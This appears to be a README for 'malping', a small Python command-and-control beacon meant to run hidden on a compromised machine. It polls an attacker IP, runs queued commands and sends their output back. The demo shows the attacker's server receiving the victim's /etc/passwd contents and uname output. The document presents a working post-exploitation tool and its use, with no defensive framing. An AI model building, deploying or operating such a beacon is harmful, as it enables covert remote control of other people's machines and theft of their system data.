# malping

A simple implementation of a post-exploitation beacon.

## overview

`malping.py` is the script that runs on the victim machine, theoretically
hidden or obscured in some way. Based on arguments, it sends a ping of sorts
to a specified ip (attacker) at a desired frequency, where `mp_server.py` may
or may not be running. As soon as `mp_server.py` is executed, `malping.py` will
be able to connect to the server and essentially ask for a command to execute, based
on arguments passed to `mp_server.py`. `malping.py` will obediently execute the
command and send the stdout back to the server.

## demo

The attacker has gotten access to the victim's machine and downloaded and executed malping. He/she does not have the server running at this point, but it's ok, malping waits patiently. Eventually the attacker is ready and starts the server, telling malping to execute the commands, "cat /etc/passwd" and "uname -a". The next time malping pings the server it sees the commands queued to be executed and does so, one at a time. When all the commands have been executed, the server stops, but malping keeps listening.

---

Victim's Machine (5.4.3.2):

```
$ ./malping.py 1.2.3.4 5                     
[+] Malping started with delay of 5 seconds.
[!] (2014-05-07 21:52:29.475144) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:34.475740) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:39.475874) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:44.477319) Could not connect to server. Waiting...
[!] (2014-05-07 21:52:49.478246) Could not connect to server. Waiting...
[+] (2014-05-07 21:52:54.480326) Executing "cat /etc/passwd"
[+] (2014-05-07 21:52:59.489891) Executing "uname -a"
[!] (2014-05-07 21:53:04.496380) Could not connect to server. Waiting...
[!] (2014-05-07 21:53:09.497329) Could not connect to server. Waiting...
[!] (2014-05-07 21:53:14.498801) Could not connect to server. Waiting...
```

Attacker's Machine (1.2.3.4):

```
$ sudo ./mp_server.py "cat /etc/passwd" "uname -a"
[+] Malping server started on 80.
[i] Connected By: ('5.4.3.2', 52252) at 2014-05-07 21:52:54.480167
[+] Sending Command: cat /etc/passwd
[+] Command Stdout:
root:!:0:0::/:/usr/bin/ksh
daemon:!:1:1::/etc:
bin:!:2:2::/bin:
sys:!:3:3::/usr/sys: 
adm:!:4:4::/var/adm:
uucp:!:5:5::/usr/lib/uucp: 
guest:!:100:100::/home/guest:
nobody:!:4294967294:4294967294::/:
lpd:!:9:4294967294::/:
lp:*:11:11::/var/spool/lp:/bin/false 
invscout:*:200:1::/var/adm/invscout:/usr/bin/ksh
nuucp:*:6:5:uucp login user:/var/spool/uucppublic:/usr/sbin/uucp/uucico
paul:!:201:1::/home/paul:/usr/bin/ksh
jdoe:*:202:1:John Doe:/home/jdoe:/usr/bin/ksh
[i] Connected By: ('5.4.3.2', 52253) at 2014-05-07 21:52:59.489664
[+] Sending Command: uname -a
[+] Command Stdout:
Linux dev-server 2.6.32-100.28.5.el6.x86_64 #1 SMP Wed Feb 2 18:40:23 EST 2011 x86_64 x86_64 x86_64 GNU/Linux

[-] Finished with commands
```
